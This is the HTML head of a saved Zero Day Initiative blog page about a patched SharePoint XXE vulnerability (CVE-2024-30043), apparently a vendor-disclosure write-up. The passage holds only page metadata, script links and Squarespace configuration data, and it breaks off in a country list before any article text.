<!DOCTYPE html>
<!-- saved from url=(0014)about:internet -->
<html xmlns:og="http://opengraphprotocol.org/schema/" xmlns:fb="http://www.facebook.com/2008/fbml" lang="en-US" class="yui3-js-enabled js flexbox canvas canvastext webgl no-touch hashchange history draganddrop rgba hsla multiplebgs backgroundsize borderimage borderradius boxshadow textshadow opacity cssanimations csscolumns cssgradients cssreflections csstransforms no-csstransforms3d csstransitions video audio svg inlinesvg svgclippaths" style="" id="yui_3_17_2_1_1762949716544_137"><div id="yui3-css-stamp" style="position: absolute !important; visibility: hidden !important"></div><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
    
    <meta name="viewport" content="width=device-width,initial-scale=1">
    
    <link href="./Zero Day Initiative — CVE-2024-30043_ Abusing URL Parsing Confusion to Exploit XXE on SharePoint Server and Cloud_files/css" rel="stylesheet">
    <link href="./Zero Day Initiative — CVE-2024-30043_ Abusing URL Parsing Confusion to Exploit XXE on SharePoint Server and Cloud_files/icon" rel="stylesheet">
    <!-- This is Squarespace. --><!-- brian-gorenc -->
<!--<base href="">--><base href=".">

<title>Zero Day Initiative — CVE-2024-30043: Abusing URL Parsing Confusion to Exploit XXE on SharePoint Server and Cloud</title>
<meta http-equiv="Accept-CH" content="Sec-CH-UA-Platform-Version, Sec-CH-UA-Model"><link rel="icon" type="image/x-icon" href="https://images.squarespace-cdn.com/content/v1/5894c269e4fcb5e65a1ed623/1487670157237-HOXHMI54TA0SZP21OY7C/favicon.ico">
<link rel="canonical" href="https://www.thezdi.com/blog/2024/5/29/cve-2024-30043-abusing-url-parsing-confusion-to-exploit-xxe-on-sharepoint-server-and-cloud">
<meta property="og:site_name" content="Zero Day Initiative">
<meta property="og:title" content="Zero Day Initiative — CVE-2024-30043: Abusing URL Parsing Confusion to Exploit XXE on SharePoint Server and Cloud">
<meta property="og:url" content="https://www.thezdi.com/blog/2024/5/29/cve-2024-30043-abusing-url-parsing-confusion-to-exploit-xxe-on-sharepoint-server-and-cloud">
<meta property="og:type" content="article">
<meta property="og:description" content="Yes, the title is right. This blog covers an XML eXternal Entity (XXE) injection vulnerability that I found in SharePoint. The bug was recently patched by Microsoft. In general, XXE vulnerabilities are not very exciting in terms of discovery and related technical aspects. They may sometimes be fun t">
<meta property="og:image" content="http://static1.squarespace.com/static/5894c269e4fcb5e65a1ed623/58a5b38cb3db2bd67b608658/66575e596871b708e060acf8/1717083886356/abstract-structure-farm-window-cattle-agriculture-594813-pxhere.com.jpg?format=1500w">
<meta property="og:image:width" content="1500">
<meta property="og:image:height" content="997">
<meta itemprop="name" content="Zero Day Initiative — CVE-2024-30043: Abusing URL Parsing Confusion to Exploit XXE on SharePoint Server and Cloud">
<meta itemprop="url" content="https://www.thezdi.com/blog/2024/5/29/cve-2024-30043-abusing-url-parsing-confusion-to-exploit-xxe-on-sharepoint-server-and-cloud">
<meta itemprop="description" content="Yes, the title is right. This blog covers an XML eXternal Entity (XXE) injection vulnerability that I found in SharePoint. The bug was recently patched by Microsoft. In general, XXE vulnerabilities are not very exciting in terms of discovery and related technical aspects. They may sometimes be fun t">
<meta itemprop="thumbnailUrl" content="http://static1.squarespace.com/static/5894c269e4fcb5e65a1ed623/58a5b38cb3db2bd67b608658/66575e596871b708e060acf8/1717083886356/abstract-structure-farm-window-cattle-agriculture-594813-pxhere.com.jpg?format=1500w">
<link rel="image_src" href="http://static1.squarespace.com/static/5894c269e4fcb5e65a1ed623/58a5b38cb3db2bd67b608658/66575e596871b708e060acf8/1717083886356/abstract-structure-farm-window-cattle-agriculture-594813-pxhere.com.jpg?format=1500w">
<meta itemprop="image" content="http://static1.squarespace.com/static/5894c269e4fcb5e65a1ed623/58a5b38cb3db2bd67b608658/66575e596871b708e060acf8/1717083886356/abstract-structure-farm-window-cattle-agriculture-594813-pxhere.com.jpg?format=1500w">
<meta itemprop="author" content="Piotr Bazydło">
<meta itemprop="datePublished" content="2024-05-30T10:44:46-0500">
<meta itemprop="dateModified" content="2024-05-30T10:44:46-0500">
<meta itemprop="headline" content="CVE-2024-30043: Abusing URL Parsing Confusion to Exploit XXE on SharePoint Server and Cloud">
<meta itemprop="publisher" content="Zero Day Initiative">
<meta name="twitter:title" content="Zero Day Initiative — CVE-2024-30043: Abusing URL Parsing Confusion to Exploit XXE on SharePoint Server and Cloud">
<meta name="twitter:image" content="http://static1.squarespace.com/static/5894c269e4fcb5e65a1ed623/58a5b38cb3db2bd67b608658/66575e596871b708e060acf8/1717083886356/abstract-structure-farm-window-cattle-agriculture-594813-pxhere.com.jpg?format=1500w">
<meta name="twitter:url" content="https://www.thezdi.com/blog/2024/5/29/cve-2024-30043-abusing-url-parsing-confusion-to-exploit-xxe-on-sharepoint-server-and-cloud">
<meta name="twitter:card" content="summary">
<meta name="twitter:description" content="Yes, the title is right. This blog covers an XML eXternal Entity (XXE) injection vulnerability that I found in SharePoint. The bug was recently patched by Microsoft. In general, XXE vulnerabilities are not very exciting in terms of discovery and related technical aspects. They may sometimes be fun t">
<meta name="description" content="">
<link rel="preconnect" href="https://images.squarespace-cdn.com/">
<link rel="preconnect" href="https://fonts.gstatic.com/" crossorigin="">
<link rel="stylesheet" href="./Zero Day Initiative — CVE-2024-30043_ Abusing URL Parsing Confusion to Exploit XXE on SharePoint Server and Cloud_files/css2"><script type="text/javascript" async="" src="./Zero Day Initiative — CVE-2024-30043_ Abusing URL Parsing Confusion to Exploit XXE on SharePoint Server and Cloud_files/analytics.js.download"></script><script type="text/javascript" async="" src="./Zero Day Initiative — CVE-2024-30043_ Abusing URL Parsing Confusion to Exploit XXE on SharePoint Server and Cloud_files/js"></script><script type="text/javascript" crossorigin="anonymous" nomodule="nomodule" src="./Zero Day Initiative — CVE-2024-30043_ Abusing URL Parsing Confusion to Exploit XXE on SharePoint Server and Cloud_files/legacy.js.download"></script>
<script type="text/javascript" crossorigin="anonymous" src="./Zero Day Initiative — CVE-2024-30043_ Abusing URL Parsing Confusion to Exploit XXE on SharePoint Server and Cloud_files/modern.js.download"></script>
<script type="text/javascript">SQUARESPACE_ROLLUPS = {};</script>
<script>(function(rollups, name) { if (!rollups[name]) { rollups[name] = {}; } rollups[name].js = ["//assets.squarespace.com/universal/scripts-compressed/extract-css-runtime-d75ad899ad99b3d3-min.en-US.js"]; })(SQUARESPACE_ROLLUPS, 'squarespace-extract_css_runtime');</script>
<script crossorigin="anonymous" src="./Zero Day Initiative — CVE-2024-30043_ Abusing URL Parsing Confusion to Exploit XXE on SharePoint Server and Cloud_files/extract-css-runtime-d75ad899ad99b3d3-min.en-US.download"></script><script>(function(rollups, name) { if (!rollups[name]) { rollups[name] = {}; } rollups[name].js = ["//assets.squarespace.com/universal/scripts-compressed/extract-css-moment-js-vendor-6f2a1f6ec9a41489-min.en-US.js"]; })(SQUARESPACE_ROLLUPS, 'squarespace-extract_css_moment_js_vendor');</script>
<script crossorigin="anonymous" src="./Zero Day Initiative — CVE-2024-30043_ Abusing URL Parsing Confusion to Exploit XXE on SharePoint Server and Cloud_files/extract-css-moment-js-vendor-6f2a1f6ec9a41489-.download"></script><script>(function(rollups, name) { if (!rollups[name]) { rollups[name] = {}; } rollups[name].js = ["//assets.squarespace.com/universal/scripts-compressed/cldr-resource-pack-22ed584d99d9b83d-min.en-US.js"]; })(SQUARESPACE_ROLLUPS, 'squarespace-cldr_resource_pack');</script>
<script crossorigin="anonymous" src="./Zero Day Initiative — CVE-2024-30043_ Abusing URL Parsing Confusion to Exploit XXE on SharePoint Server and Cloud_files/cldr-resource-pack-22ed584d99d9b83d-min.en-US..download"></script><script>(function(rollups, name) { if (!rollups[name]) { rollups[name] = {}; } rollups[name].js = ["//assets.squarespace.com/universal/scripts-compressed/common-vendors-stable-fbd854d40b0804b7-min.en-US.js"]; })(SQUARESPACE_ROLLUPS, 'squarespace-common_vendors_stable');</script>
<script crossorigin="anonymous" src="./Zero Day Initiative — CVE-2024-30043_ Abusing URL Parsing Confusion to Exploit XXE on SharePoint Server and Cloud_files/common-vendors-stable-fbd854d40b0804b7-min.en-.download"></script><script>(function(rollups, name) { if (!rollups[name]) { rollups[name] = {}; } rollups[name].js = ["//assets.squarespace.com/universal/scripts-compressed/common-vendors-8a7cfb65d43b8de5-min.en-US.js"]; })(SQUARESPACE_ROLLUPS, 'squarespace-common_vendors');</script>
<script crossorigin="anonymous" src="./Zero Day Initiative — CVE-2024-30043_ Abusing URL Parsing Confusion to Exploit XXE on SharePoint Server and Cloud_files/common-vendors-8a7cfb65d43b8de5-min.en-US.js.download"></script><script>(function(rollups, name) { if (!rollups[name]) { rollups[name] = {}; } rollups[name].js = ["//assets.squarespace.com/universal/scripts-compressed/common-516d0834eb415d94-min.en-US.js"]; })(SQUARESPACE_ROLLUPS, 'squarespace-common');</script>
<script crossorigin="anonymous" src="./Zero Day Initiative — CVE-2024-30043_ Abusing URL Parsing Confusion to Exploit XXE on SharePoint Server and Cloud_files/common-516d0834eb415d94-min.en-US.js.download"></script><script>(function(rollups, name) { if (!rollups[name]) { rollups[name] = {}; } rollups[name].js = ["//assets.squarespace.com/universal/scripts-compressed/user-account-core-c4220b44c6951cc5-min.en-US.js"]; })(SQUARESPACE_ROLLUPS, 'squarespace-user_account_core');</script>
<script crossorigin="anonymous" src="./Zero Day Initiative — CVE-2024-30043_ Abusing URL Parsing Confusion to Exploit XXE on SharePoint Server and Cloud_files/user-account-core-c4220b44c6951cc5-min.en-US.j.download"></script><script>(function(rollups, name) { if (!rollups[name]) { rollups[name] = {}; } rollups[name].css = ["//assets.squarespace.com/universal/styles-compressed/user-account-core-89dabefb87591b1e-min.en-US.css"]; })(SQUARESPACE_ROLLUPS, 'squarespace-user_account_core');</script>
<link rel="stylesheet" type="text/css" href="./Zero Day Initiative — CVE-2024-30043_ Abusing URL Parsing Confusion to Exploit XXE on SharePoint Server and Cloud_files/user-account-core-89dabefb87591b1e-min.en-US.css"><script>(function(rollups, name) { if (!rollups[name]) { rollups[name] = {}; } rollups[name].js = ["//assets.squarespace.com/universal/scripts-compressed/performance-45cdefef297be205-min.en-US.js"]; })(SQUARESPACE_ROLLUPS, 'squarespace-performance');</script>
<script crossorigin="anonymous" src="./Zero Day Initiative — CVE-2024-30043_ Abusing URL Parsing Confusion to Exploit XXE on SharePoint Server and Cloud_files/performance-45cdefef297be205-min.en-US.js.download" defer=""></script><script data-name="static-context">Static = window.Static || {}; Static.SQUARESPACE_CONTEXT = {"betaFeatureFlags":["campaigns_discount_section_in_blasts","campaigns_merch_state","campaigns_discount_section_in_automations","order_status_page_checkout_landing_enabled","i18n_beta_website_locales","campaigns_new_image_layout_picker","campaigns_thumbnail_layout","marketing_landing_page","marketing_automations","contacts_and_campaigns_redesign","campaigns_import_discounts","use_react_flow_in_automations_flowchart","enable_form_submission_trigger","bfcm_2025_enabled"],"facebookAppId":"314192535267336","facebookApiVersion":"v6.0","rollups":{"squarespace-announcement-bar":{"js":"//assets.squarespace.com/universal/scripts-compressed/announcement-bar-bc29aabcad9b0321-min.en-US.js"},"squarespace-audio-player":{"css":"//assets.squarespace.com/universal/styles-compressed/audio-player-b05f5197a871c566-min.en-US.css","js":"//assets.squarespace.com/universal/scripts-compressed/audio-player-e160d216aed116bb-min.en-US.js"},"squarespace-blog-collection-list":{"css":"//assets.squarespace.com/universal/styles-compressed/blog-collection-list-b4046463b72f34e2-min.en-US.css","js":"//assets.squarespace.com/universal/scripts-compressed/blog-collection-list-f78db80fc1cd6fce-min.en-US.js"},"squarespace-calendar-block-renderer":{"css":"//assets.squarespace.com/universal/styles-compressed/calendar-block-renderer-b72d08ba4421f5a0-min.en-US.css","js":"//assets.squarespace.com/universal/scripts-compressed/calendar-block-renderer-182e89e126289b13-min.en-US.js"},"squarespace-chartjs-helpers":{"css":"//assets.squarespace.com/universal/styles-compressed/chartjs-helpers-96b256171ee039c1-min.en-US.css","js":"//assets.squarespace.com/universal/scripts-compressed/chartjs-helpers-4fd57f343946d08e-min.en-US.js"},"squarespace-comments":{"css":"//assets.squarespace.com/universal/styles-compressed/comments-d47e61fe47b5ff82-min.en-US.css","js":"//assets.squarespace.com/universal/scripts-compressed/comments-0f751aea9339e89c-min.en-US.js"},"squarespace-custom-css-popup":{"css":"//assets.squarespace.com/universal/styles-compressed/custom-css-popup-89143d073173c3e0-min.en-US.css","js":"//assets.squarespace.com/universal/scripts-compressed/custom-css-popup-5177f6aaf8a61cab-min.en-US.js"},"squarespace-dialog":{"css":"//assets.squarespace.com/universal/styles-compressed/dialog-f9093f2d526b94df-min.en-US.css","js":"//assets.squarespace.com/universal/scripts-compressed/dialog-5abd3585de282bb5-min.en-US.js"},"squarespace-events-collection":{"css":"//assets.squarespace.com/universal/styles-compressed/events-collection-b72d08ba4421f5a0-min.en-US.css","js":"//assets.squarespace.com/universal/scripts-compressed/events-collection-5fa01fd523721c94-min.en-US.js"},"squarespace-form-rendering-utils":{"js":"//assets.squarespace.com/universal/scripts-compressed/form-rendering-utils-dea9bf383ee1a39c-min.en-US.js"},"squarespace-forms":{"css":"//assets.squarespace.com/universal/styles-compressed/forms-0afd3c6ac30bbab1-min.en-US.css","js":"//assets.squarespace.com/universal/scripts-compressed/forms-3293f203da904154-min.en-US.js"},"squarespace-gallery-collection-list":{"css":"//assets.squarespace.com/universal/styles-compressed/gallery-collection-list-b4046463b72f34e2-min.en-US.css","js":"//assets.squarespace.com/universal/scripts-compressed/gallery-collection-list-07747667a3187b76-min.en-US.js"},"squarespace-image-zoom":{"css":"//assets.squarespace.com/universal/styles-compressed/image-zoom-b4046463b72f34e2-min.en-US.css","js":"//assets.squarespace.com/universal/scripts-compressed/image-zoom-60c18dc5f8f599ea-min.en-US.js"},"squarespace-pinterest":{"css":"//assets.squarespace.com/universal/styles-compressed/pinterest-b4046463b72f34e2-min.en-US.css","js":"//assets.squarespace.com/universal/scripts-compressed/pinterest-2fa208f4b63c95af-min.en-US.js"},"squarespace-popup-overlay":{"css":"//assets.squarespace.com/universal/styles-compressed/popup-overlay-b742b752f5880972-min.en-US.css","js":"//assets.squarespace.com/universal/scripts-compressed/popup-overlay-904ea14ca76293f9-min.en-US.js"},"squarespace-product-quick-view":{"css":"//assets.squarespace.com/universal/styles-compressed/product-quick-view-9052fb446c5800ee-min.en-US.css","js":"//assets.squarespace.com/universal/scripts-compressed/product-quick-view-73a41171b1c96185-min.en-US.js"},"squarespace-products-collection-item-v2":{"css":"//assets.squarespace.com/universal/styles-compressed/products-collection-item-v2-b4046463b72f34e2-min.en-US.css","js":"//assets.squarespace.com/universal/scripts-compressed/products-collection-item-v2-e3a3f101748fca6e-min.en-US.js"},"squarespace-products-collection-list-v2":{"css":"//assets.squarespace.com/universal/styles-compressed/products-collection-list-v2-b4046463b72f34e2-min.en-US.css","js":"//assets.squarespace.com/universal/scripts-compressed/products-collection-list-v2-eedc544f4cc56af4-min.en-US.js"},"squarespace-search-page":{"css":"//assets.squarespace.com/universal/styles-compressed/search-page-90a67fc09b9b32c6-min.en-US.css","js":"//assets.squarespace.com/universal/scripts-compressed/search-page-7d8afa9eb5e09a2d-min.en-US.js"},"squarespace-search-preview":{"js":"//assets.squarespace.com/universal/scripts-compressed/search-preview-21194fc3d3addc8e-min.en-US.js"},"squarespace-simple-liking":{"css":"//assets.squarespace.com/universal/styles-compressed/simple-liking-701bf8bbc05ec6aa-min.en-US.css","js":"//assets.squarespace.com/universal/scripts-compressed/simple-liking-e6bc64da9e3b1cf4-min.en-US.js"},"squarespace-social-buttons":{"css":"//assets.squarespace.com/universal/styles-compressed/social-buttons-95032e5fa98e47a5-min.en-US.css","js":"//assets.squarespace.com/universal/scripts-compressed/social-buttons-81b2f14e6410778c-min.en-US.js"},"squarespace-tourdates":{"css":"//assets.squarespace.com/universal/styles-compressed/tourdates-b4046463b72f34e2-min.en-US.css","js":"//assets.squarespace.com/universal/scripts-compressed/tourdates-ebc8e4d29314c4fd-min.en-US.js"},"squarespace-website-overlays-manager":{"css":"//assets.squarespace.com/universal/styles-compressed/website-overlays-manager-07ea5a4e004e6710-min.en-US.css","js":"//assets.squarespace.com/universal/scripts-compressed/website-overlays-manager-c044e70cefe65977-min.en-US.js"}},"pageType":50,"website":{"id":"5894c269e4fcb5e65a1ed623","identifier":"brian-gorenc","websiteType":1,"contentModifiedOn":1755108158609,"cloneable":false,"hasBeenCloneable":false,"developerMode":true,"siteStatus":{},"language":"en-US","translationLocale":"en-US","formattingLocale":"en-US","timeZone":"America/Chicago","machineTimeZoneOffset":-21600000,"timeZoneOffset":-21600000,"timeZoneAbbr":"CST","siteTitle":"Zero Day Initiative","fullSiteTitle":"Zero Day Initiative \u2014 CVE-2024-30043: Abusing URL Parsing Confusion to Exploit XXE on SharePoint Server and Cloud","siteDescription":"","location":{},"shareButtonOptions":{"6":true,"1":true,"2":true,"4":true,"3":true},"authenticUrl":"https://www.thezdi.com","internalUrl":"https://brian-gorenc.squarespace.com","baseUrl":"https://www.thezdi.com","primaryDomain":"www.thezdi.com","sslSetting":3,"isHstsEnabled":true,"socialAccounts":[{"serviceId":11,"userId":"UChbH7B5YhXANmlMYJRHpw0g","screenname":"TippingPoint Zero Day Initiative","addedOn":1492722141068,"profileUrl":"https://www.youtube.com/channel/UChbH7B5YhXANmlMYJRHpw0g","iconUrl":"https://yt3.ggpht.com/-5tyoeQlg_Jk/AAAAAAAAAAI/AAAAAAAAAAA/lrjg7w8bQgA/s88-c-k-no-mo-rj-c0xffffff/photo.jpg","iconEnabled":true,"serviceName":"youtube"}],"typekitId":"","statsMigrated":false,"imageMetadataProcessingEnabled":false,"screenshotId":"a0a901f81f08cc6c7c9e5108d43c513fa4847e74de2b39c335909e3f8dd88d34","captchaSettings":{"enabledForDonations":false},"showOwnerLogin":false},"websiteSettings":{"id":"5894c269e4fcb5e65a1ed625","websiteId":"5894c269e4fcb5e65a1ed623","subjects":[],"country":"US","state":"TX","simpleLikingEnabled":true,"mobileInfoBarSettings":{"isContactEmailEnabled":false,"isContactPhoneNumberEnabled":false,"isLocationEnabled":false,"isBusinessHoursEnabled":false},"commentLikesAllowed":true,"commentAnonAllowed":true,"commentThreaded":true,"commentApprovalRequired":false,"commentAvatarsOn":true,"commentSortType":2,"commentFlagThreshold":0,"commentFlagsAllowed":true,"commentEnableByDefault":true,"commentDisableAfterDaysDefault":0,"disqusShortname":"","commentsEnabled":false,"contactPhoneNumber":"","storeSettings":{"returnPolicy":null,"termsOfService":null,"privacyPolicy":null,"expressCheckout":false,"continueShoppingLinkUrl":"/","useLightCart":false,"showNoteField":false,"shippingCountryDefaultValue":"US","billToShippingDefaultValue":false,"showShippingPhoneNumber":true,"isShippingPhoneRequired":false,"showBillingPhoneNumber":true,"isBillingPhoneRequired":false,"currenciesSupported":["CHF","HKD","MXN","EUR","DKK","USD","CAD","MYR","NOK","THB","AUD","SGD","ILS","PLN","GBP","CZK","SEK","NZD","PHP","RUB"],"defaultCurrency":"USD","selectedCurrency":"USD","measurementStandard":1,"showCustomCheckoutForm":false,"checkoutPageMarketingOptInEnabled":false,"enableMailingListOptInByDefault":false,"sameAsRetailLocation":false,"merchandisingSettings":{"scarcityEnabledOnProductItems":false,"scarcityEnabledOnProductBlocks":false,"scarcityMessageType":"DEFAULT_SCARCITY_MESSAGE","scarcityThreshold":10,"multipleQuantityAllowedForServices":true,"restockNotificationsEnabled":false,"restockNotificationsSuccessText":"","restockNotificationsMailingListSignUpEnabled":false,"relatedProductsEnabled":false,"relatedProductsOrdering":"random","soldOutVariantsDropdownDisabled":false,"productComposerOptedIn":false,"productComposerABTestOptedOut":false,"productReviewsEnabled":false,"displayImportedProductReviewsEnabled":false,"hasOptedToCollectNativeReviews":false},"minimumOrderSubtotalEnabled":false,"minimumOrderSubtotal":{"currency":"USD","value":"0.00"},"isLive":false,"multipleQuantityAllowedForServices":true},"useEscapeKeyToLogin":true,"ssBadgeType":1,"ssBadgePosition":4,"ssBadgeVisibility":1,"ssBadgeDevices":1,"pinterestOverlayOptions":{"mode":"disabled"},"userAccountsSettings":{"loginAllowed":false,"signupAllowed":false}},"cookieSettings":{"isCookieBannerEnabled":false,"isRestrictiveCookiePolicyEnabled":false,"cookieBannerText":"","cookieBannerTheme":"","cookieBannerVariant":"","cookieBannerPosition":"","cookieBannerCtaVariant":"","cookieBannerCtaText":"","cookieBannerAcceptType":"OPT_IN","cookieBannerOptOutCtaText":"","cookieBannerHasOptOut":false,"cookieBannerHasManageCookies":true,"cookieBannerManageCookiesLabel":"","cookieBannerSavedPreferencesText":"","cookieBannerSavedPreferencesLayout":"PILL"},"websiteCloneable":false,"collection":{"title":"Blog","id":"58a5b38cb3db2bd67b608658","fullUrl":"/blog","type":1,"permissionType":1},"item":{"title":"CVE-2024-30043: Abusing URL Parsing Confusion to Exploit XXE on SharePoint Server and Cloud","id":"66575e596871b708e060acf8","fullUrl":"/blog/2024/5/29/cve-2024-30043-abusing-url-parsing-confusion-to-exploit-xxe-on-sharepoint-server-and-cloud","publicCommentCount":0,"commentState":2,"recordType":1},"subscribed":false,"appDomain":"squarespace.com","templateTweakable":true,"tweakJSON":{"aspect-ratio":"Auto","bg-image":"{background-image:url(\"https://static1.squarespace.com/static/56cb6c0001dbae33a8227531/t/56ccdc64cf80a1db151ed7dd/1456266340825/cocktail-bw.jpg\");background-position:center center;background-size:cover;background-attachment:scroll;background-repeat:no-repeat}","gallery-arrow-style":"No Background","gallery-aspect-ratio":"3:2 Standard","gallery-auto-crop":"true","gallery-autoplay":"false","gallery-design":"Slideshow","gallery-info-overlay":"Show on Hover","gallery-loop":"false","gallery-navigation":"Bullets","gallery-show-arrows":"true","gallery-transitions":"Fade","galleryArrowBackground":"rgba(34,34,34,1)","galleryArrowColor":"rgba(255,255,255,1)","galleryAutoplaySpeed":"3","galleryCircleColor":"rgba(255,255,255,1)","galleryInfoBackground":"rgba(0, 0, 0, .7)","galleryThumbnailSize":"100px","gridSize":"350px","gridSpacing":"20px","product-gallery-auto-crop":"true","product-image-auto-crop":"true","tweak-v1-related-products-title-spacing":"50px"},"templateId":"67aa61355065f439ea56543f","templateVersion":"7","pageFeatures":[1,2,4],"gmRenderKey":"QUl6YVN5Q0JUUk9xNkx1dkZfSUUxcjQ2LVQ0QWVUU1YtMGQ3bXk4","templateScriptsRootUrl":"https://static1.squarespace.com/static/ta/5894c269e4fcb5e65a1ed623/33/scripts/","impersonatedSession":false,"tzData":{"zones":[[-360,"US","C%sT",null]],"rules":{"US":[[1967,2006,null,"Oct","lastSun","2:00","0","S"],[1987,2006,null,"Apr","Sun>=1","2:00","1:00","D"],[2007,"max",null,"Mar","Sun>=8","2:00","1:00","D"],[2007,"max",null,"Nov","Sun>=1","2:00","0","S"]]}},"showAnnouncementBar":false,"recaptchaEnterpriseContext":{"recaptchaEnterpriseSiteKey":"6LdDFQwjAAAAAPigEvvPgEVbb7QBm-TkVJdDTlAv"},"i18nContext":{"timeZoneData":{"id":"America/Chicago","name":"Central Time"}},"env":"PRODUCTION","visitorFormContext":{"formFieldFormats":{"initialPhoneFormat":{"id":0,"type":"PHONE_NUMBER","country":"US","labelLocale":"en-US","fields":[{"type":"SEPARATOR","label":"(","identifier":"LeftParen","length":0,"required":false,"metadata":{}},{"type":"FIELD","label":"1","identifier":"1","length":3,"required":false,"metadata":{}},{"type":"SEPARATOR","label":")","identifier":"RightParen","length":0,"required":false,"metadata":{}},{"type":"SEPARATOR","label":" ","identifier":"Space","length":0,"required":false,"metadata":{}},{"type":"FIELD","label":"2","identifier":"2","length":3,"required":false,"metadata":{}},{"type":"SEPARATOR","label":"-","identifier":"Dash","length":0,"required":false,"metadata":{}},{"type":"FIELD","label":"3","identifier":"3","length":14,"required":false,"metadata":{}}]},"countries":[{"name":"Afghanistan","code":"AF","phoneCode":"+93"},{"name":"\u00C5land Islands","code":"AX","phoneCode":"+358"},{"name":"Albania","code":"AL","phoneCode":"+355"},{"name":"Algeria","code":"DZ","phoneCode":"+213"},{"name":"American Samoa","code":"AS","phoneCode":"+1"},{"name":"Andorra","code":"AD","phoneCode":"+376"},{"name":"Angola","code":"AO","phoneCode":"+244"},{"name":"Anguilla","code":"AI","phoneCode":"+1"},{"name":"Antigua & Barbuda","code":"AG","phoneCode":"+1"},{"name":"Argentina","code":"AR","phoneCode":"+54"},{"name":"Armenia","code":"AM","phoneCode":"+374"},{"name":"Aruba","code":"AW","phoneCode":"+297"},{"name":"Ascension Island","code":"AC","phoneCode":"+247"},{"name":"Australia","code":"AU","phoneCode":"+61"},{"name":"Austria","code":"AT","phoneCode":"+43"},{"name":"Azerbaijan","code":"AZ","phoneCode":"+994"},{"name":"Bahamas","code":"BS","phoneCode":"+1"},{"name":"Bahrain","code":"BH","phoneCode":"+973"},{"name":"Bangladesh","code":"BD","phoneCode":"+880"},{"name":"Barbados","code":"BB","phoneCode":"+1"},{"name":"Belarus","code":"BY","phoneCode":"+375"},{"name":"Belgium","code":"BE","phoneCode":"+32"},{"name":"Belize","code":"BZ","phoneCode":"+501"},{"name":"Benin","code":"BJ","phoneCode":"+229"},{"name":"Bermuda","code":"BM","phoneCode":"+1"},{"name":"Bhutan","code":"BT","phoneCode":"+975"},{"name":"Bolivia","code":"BO","phoneCode":"+591"},{"name":"Bosnia & Herzegovina","code":"BA","phoneCode":"+387"},{"name":"Botswana","code":"BW","phoneCode":"+267"},{"name":"Brazil","code":"BR","phoneCode":"+55"},{"name":"British Indian Ocean Territory","code":"IO","phoneCode":"+246"},{"name":"British Virgin Islands","code":"VG","phoneCode":"+1"},{"name":"Brunei","code":"BN","phoneCode":"+673"},{"name":"Bulgaria","code":"BG","phoneCode":"+359"},{"name":"Burkina Faso","code":"BF","phoneCode":"+226"},{"name":"Burundi","code":"BI","phoneCode":"+257"},{"name":"Cambodia","code":"KH","phoneCode":"+855"},{"name":"Cameroon","code":"CM","phoneCode":"+237"},{"name":"Canada","code":"CA","phoneCode":"+1"},{"name":"Cape Verde","code":"CV","phoneCode":"+238"},{"name":"Caribbean Netherlands","code":"BQ","phoneCode":"+599"},{"name":"Cayman Islands","code":"KY","phoneCode":"+1"},{"name":"Central African Republic","code":"CF","phoneCode":"+236"},{"name":"Chad","code":"TD","phoneCode":"+235"},{"name":"Chile","code":"CL","phoneCode":"+56"},{"name":"China","code":"CN","phoneCode":"+86"},{"name":"Christmas Island","code":"CX","phoneCode":"+61"},{"name":"Cocos (Keeling) Islands","code":"CC","phoneCode":"+61"},{"name":"Colombia","code":"CO","phoneCode":"+57"},{"name":"Comoros","code":"KM","phoneCode":"+269"},{"name":"Congo - Brazzaville","code":"CG","phoneCode":"+242"},{"name":"Congo - Kinshasa","code":"CD","phoneCode":"+243"},{"name":"Cook Islands","code":"CK","phoneCode":"+682"},{"name":"Costa Rica","code":"CR","phoneCode":"+506"},{"name":"C\u00F4te d\u2019Ivoire","code":"CI","phoneCode":"+225"},{"name":"Croatia","code":"HR","phoneCode":"+385"},{"name":"Cuba","code":"CU","phoneCode":"+53"},{"name":"Cura\u00E7ao","code":"CW","phoneCode":"+599"},{"name":"Cyprus","code":"CY","phoneCode":"+357"},{"name":"Czechia","code":"CZ","phoneCode":"+420"},{"name":"Denmark","code":"DK","phoneCode":"+45"},{"name":"Djibouti","code":"DJ","phoneCode":"+253"},{"name":"Dominica","code":"DM","phoneCode":"+1"},{"name":"Dominican Republic","code":"DO","phoneCode":"+1"},{"name":"Ecuador","code":"EC","phoneCode":"+593"},{"name":"Egypt","code":"EG","phoneCode":"+20"},{"name":"El Salvador","code":"SV","phoneCode":"+503"},{"name":"Equatorial Guinea","code":"GQ","phoneCode":"+240"},{"name":"Eritrea","code":"ER","phoneCode":"+291"},{"name":"Estonia","code":"EE","phoneCode":"+372"},{"name":"Eswatini","code":"SZ","phoneCode":"+268"},{"name":"Ethiopia","code":"ET","phoneCode":"+251"},{"name":"Falkland Islands","code":"FK","phoneCode":"+500"},{"name":"Faroe Islands","code":"FO","phoneCode":"+298"},{"name":"Fiji","code":"FJ","phoneCode":"+679"},{"name":"Finland","code":"FI","phoneCode":"+358"},{"name":"France","code":"FR","phoneCode":"+33"},{"name":"French Guiana","code":"GF","phoneCode":"+594"},{"name":"French Polynesia","code":"PF","phoneCode":"+689"},{"name":"Gabon","code":"GA","phoneCode":"+241"},{"name":"Gambia","code":"GM","phoneCode":"+220"},{"name":"Georgia","code":"GE","phoneCode":"+995"},{"name":"Germany","code":"DE","phoneCode":"+49"},{"name":"Ghana","code":"GH","phoneCode":"+233"},{"name":"Gibraltar","code":"GI","phoneCode":"+350"},{"name":"Greece","code":"GR","phoneCode":"+30"},{"name":"Greenland","code":"GL","phoneCode":"+299"},{"name":"Grenada","code":"GD","phoneCode":"+1"},{"name":"Guadeloupe","code":"GP","phoneCode":"+590"},{"name":"Guam","code":"GU","phoneCode":"+1"},{"name":"Guatemala","code":"GT","phoneCode":"+502"},{"name":"Guernsey","code":"GG","phoneCode":"+44"},{"name":"Guinea","code":"GN","phoneCode":"+224"},{"name":"Guinea-Bissau","code":"GW","phoneCode":"+245"},{"name":"Guyana","code":"GY","phoneCode":"+592"},{"name":"Haiti","code":"HT","phoneCode":"+509"},{"name":"Honduras","code":"HN","phoneCode":"+504"},{"name":"Hong Kong SAR China","code":"HK","phoneCode":"+852"},{"name":"Hungary","code":"HU","phoneCode":"+36"},{"name":"Iceland","code":"IS","phoneCode":"+354"},{"name":"India","code":"IN","phoneCode":"+91"},{"name":"Indonesia","code":"ID","phoneCode":"+62"},{"name":"Iran","code":"IR","phoneCode":"+98"},{"name":"Iraq","code":"IQ","phoneCode":"+964"},{"name":"Ireland","code":"IE","phoneCode":"+353"},{"name":"Isle of 